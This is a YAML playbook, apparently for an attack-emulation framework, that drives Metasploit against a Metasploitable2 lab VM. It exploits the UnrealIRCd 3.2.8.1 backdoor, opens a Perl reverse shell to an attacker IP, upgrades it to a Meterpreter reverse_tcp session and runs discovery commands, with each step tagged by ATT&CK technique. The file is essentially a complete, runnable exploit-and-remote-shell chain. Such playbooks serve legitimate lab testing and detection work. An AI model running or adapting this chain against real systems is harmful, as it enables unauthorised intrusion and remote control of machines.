#
# Author: Wolfgang Hotwagner
# Description:
#     This playbook perfoms the following attack-steps:
#     1. Exploit the unreal_irc_backdoor
#     2. Execute command in reverse-shell
#     3. Upgrade reverse-shell to meterpreter shell
#     4. Execute commands in meterpreter shell
#
# Requirements:
#     1. Run this on kali-linux
#     2. Metasploit installed and msfrpd executed
#     3. Target a Metasploitable2-VM
#
vars:
  METASPLOITABLE: 192.168.0.146
  ATTACKER: 192.168.0.29
  PAYLOAD: cmd/unix/reverse_perl
  LPORT: "4422"

commands:
  # Perform Unreal-Irc-Backdoor-Exploit
  - type: msf-module
    creates_session: shell
    cmd: exploit/unix/irc/unreal_ircd_3281_backdoor
    payload: $PAYLOAD
    payload_options:
      LHOST: $ATTACKER
      LPORT: $LPORT
    options:
      RHOSTS: $METASPLOITABLE
    metadata:
      description: "Exploit backdoor in ircd to gain shell access"
      techniques: "T1190,T1059.004,T1195.002"
      tactics: "Initial Access,Execution"

  # Execute unix-command 'id' via reverse-shell
  - type: msf-session
    session: shell
    cmd: id
    metadata:
      description: "Verify shell access and check current user"
      techniques: "T1033"
      tactics: "Discovery"

  # Upgrade reverse-shell to meterpreter-shell
  - type: msf-module
    creates_session: upgraded
    cmd: post/multi/manage/shell_to_meterpreter
    options:
      SESSION: $LAST_MSF_SESSION
    payload: linux/x86/meterpreter/reverse_tcp
    payload_options:
      LHOST: $ATTACKER
      LPORT: "4433"
    metadata:
      description: "Upgrade shell to meterpreter shell"

  # Execute meterpreter-command 'sysinfo'
  - type: msf-session
    session: upgraded
    stdapi: True
    cmd: sysinfo
    metadata:
      description: "Retrieve system information"
      techniques: "T1082"
      tactics: "Discovery"

